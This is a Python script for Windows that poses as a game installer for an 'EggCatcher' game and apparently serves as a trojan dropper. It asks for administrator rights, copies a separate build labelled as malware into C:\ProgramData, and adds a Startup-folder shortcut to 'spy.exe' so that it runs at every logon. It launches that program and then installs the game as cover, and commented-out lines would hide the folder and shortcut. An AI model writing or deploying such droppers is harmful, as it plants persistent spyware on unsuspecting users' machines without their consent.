import os
import ctypes, winshell,sys
from win32com.client import Dispatch


GAME_INSTALL_ROOT=os.path.normpath(os.path.expanduser("~/Desktop"))
#GAME_INSTALL_ROOT='C:\\Users\\lenovo\\OneDrive\\Desktop'
GAME_INSTALL_FOLDER='Your_Game'

AGENT_FOLDER='utsavhere'
HIDE_COMMAND=f'attrib +h {AGENT_FOLDER}'
AGENT_INSTALL_PATH='C:\\ProgramData'

GAME_DATA_PATH=f'{os.getcwd()}\\EggCatcher\\build\\exe.win-amd64-3.10'
COPY_GAME_DATA_CMD=f'xcopy /s {GAME_DATA_PATH} {GAME_INSTALL_ROOT}\\{GAME_INSTALL_FOLDER}'

MAL_DATA_PATH=f'{os.getcwd()}\\executable\\build\\exe.win-amd64-3.9'
MAL_INSTALL_PATH=f'{AGENT_INSTALL_PATH}\\{AGENT_FOLDER}'
COPY_MAL_DATA_CMD=f'xcopy /s {MAL_DATA_PATH} {MAL_INSTALL_PATH}'


MAL_LNK_SOURCE='C:\\ProgramData\\utsav\\spy.exe'
MAL_LNK_INSTALL_LOCATION=f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
MAL_LNK_PATH=f'{MAL_LNK_INSTALL_LOCATION}\\spy.lnk'

def malInstall():
    global AGENT_FOLDER,HIDE_COMMAND,AGENT_INSTALL_PATH,COPY_MAL_DATA_CMD
    global MAL_LNK_SOURCE,MAL_LNK_INSTALL_LOCATION,MAL_LNK_PATH
    os.chdir(AGENT_INSTALL_PATH)
    os.system(f'md {AGENT_FOLDER}')
    os.system(f'{COPY_MAL_DATA_CMD}')
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(MAL_LNK_PATH)
    shortcut.Targetpath = MAL_LNK_SOURCE
    shortcut.WorkingDirectory = MAL_LNK_INSTALL_LOCATION
    shortcut.save()
    #os.system(f'attrib +h {AGENT_FOLDER}')
    os.chdir(f'{MAL_LNK_INSTALL_LOCATION}')
    os.system('start spy.lnk')
    #os.system('attrib.exe +h spy.lnk /L')


def gameInstall():
    global GAME_INSTALL_ROOT,GAME_INSTALL_FOLDER,COPY_GAME_DATA_CMD
    os.chdir(GAME_INSTALL_ROOT)
    os.system(f'md {GAME_INSTALL_FOLDER}')
    os.system(f'{COPY_GAME_DATA_CMD}')


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def MalInstall():
    if is_admin():
        malInstall()
        gameInstall()
        pass
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

MalInstall()

